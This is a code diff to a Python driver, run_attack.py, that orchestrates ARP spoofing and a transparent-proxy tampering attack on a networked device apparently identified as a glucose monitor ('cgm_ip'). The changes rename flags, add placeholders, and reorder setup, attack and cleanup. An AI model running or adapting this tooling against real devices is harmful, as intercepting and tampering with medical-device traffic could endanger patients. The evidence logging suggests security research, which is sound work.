@@ -102,13 +102,14 @@ def _parse_args() -> argparse.Namespace:
         epilog=(
             "Examples:\n"
             "  python3 run_attack.py --show-config\n"
-            "  python3 run_attack.py --set-config network_interface=\"wlan0\"\n"
-            "  python3 run_attack.py --set-config cgm_ip=\"192.168.0.18\"\n"
+            "  python3 run_attack.py --set-config network_interface=\"<network_interface>\"\n"
+            "  python3 run_attack.py --set-config cgm_ip=\"<cgm_ip_address>\"\n"
+            "  python3 run_attack.py --set-config gateway_ip=\"<gateway_ip_address>\"\n"
             "  python3 run_attack.py --show-config  # verify placeholders were replaced\n"
             "  sudo python3 run_attack.py --setup\n"
             "  sudo python3 run_attack.py --cleanup\n"
-            "  sudo python3 run_attack.py --pi-setup\n"
-            "  sudo python3 run_attack.py --pi-cleanup\n"
+            "  sudo python3 run_attack.py --ip-forwarding-enable\n"
+            "  sudo python3 run_attack.py --ip-forwarding-disable\n"
             "  sudo python3 run_attack.py --proxy-setup\n"
             "  sudo python3 run_attack.py --proxy-cleanup\n"
             "  sudo python3 run_attack.py\n"
@@ -136,17 +137,17 @@ def _parse_args() -> argparse.Namespace:
         default=False,
         help=(
             "Skip ARP spoofing. Use for single-machine or loopback testing "
-            "where traffic is already routed through the Pi."
+            "where traffic is already routed through the attacker node."
         ),
     )
     parser.add_argument(
-        "--pi-setup",
+        "--ip-forwarding-enable",
         action="store_true",
         default=False,
         help="Enable attacker-node IP forwarding and exit.",
     )
     parser.add_argument(
-        "--pi-cleanup",
+        "--ip-forwarding-disable",
         action="store_true",
         default=False,
         help="Disable attacker-node IP forwarding and exit.",
@@ -237,8 +238,10 @@ def main() -> None:
         LOGGER.info("config updated path=%s", args.config)
         return
 
-    if args.pi_setup and args.pi_cleanup:
-        LOGGER.error("choose only one of --pi-setup or --pi-cleanup")
+    if args.ip_forwarding_enable and args.ip_forwarding_disable:
+        LOGGER.error(
+            "choose only one of --ip-forwarding-enable or --ip-forwarding-disable"
+        )
         sys.exit(1)
     if args.proxy_setup and args.proxy_cleanup:
         LOGGER.error("choose only one of --proxy-setup or --proxy-cleanup")
@@ -250,14 +253,14 @@ def main() -> None:
         LOGGER.error("choose only one of --setup or --cleanup")
         sys.exit(1)
 
-    if args.pi_setup:
+    if args.ip_forwarding_enable:
         spoofer.enable_ip_forwarding()
-        LOGGER.info("pi_setup complete")
+        LOGGER.info("ip_forwarding_enable complete")
         return
 
-    if args.pi_cleanup:
+    if args.ip_forwarding_disable:
         spoofer.disable_ip_forwarding()
-        LOGGER.info("pi_cleanup complete")
+        LOGGER.info("ip_forwarding_disable complete")
         return
 
     if args.proxy_setup:
@@ -292,32 +295,34 @@ def main() -> None:
     )
 
     policy = TamperPolicy(config.tamper_policy)
+
+    if args.dry_run:
+        LOGGER.info(
+            "dry_run complete. Run without --dry-run to perform setup and start the attack."
+        )
+        return
+
     evidence = EvidenceLogger(config)
-
-    if not args.dry_run:
-        _auto_setup_for_attack(config, spoofer)
-
-    if not args.no_arp:
-        spoofer.start()
-
-    attack = TransparentProxyAttack(config, policy, evidence)
+    attack: TransparentProxyAttack | None = None
 
     try:
-        if args.dry_run:
-            LOGGER.info(
-                "dry_run complete. Set iptables rule and run without --dry-run to start attack."
-            )
-        else:
-            attack.start()
+        _auto_setup_for_attack(config, spoofer)
+
+        if not args.no_arp:
+            spoofer.start()
+
+        attack = TransparentProxyAttack(config, policy, evidence)
+        attack.start()
     except KeyboardInterrupt:
         LOGGER.info("keyboard_interrupt received, stopping attack")
     except Exception as exc:
         LOGGER.error("attack_error=%s", exc)
     finally:
+        if attack is not None:
+            attack.stop()
         if not args.no_arp:
             spoofer.stop()
-        if not args.dry_run:
-            _auto_cleanup_for_attack(config, spoofer)
+        _auto_cleanup_for_attack(config, spoofer)
         evidence.stop()
         LOGGER.info(
             "attack stopped. Evidence files written:\n"
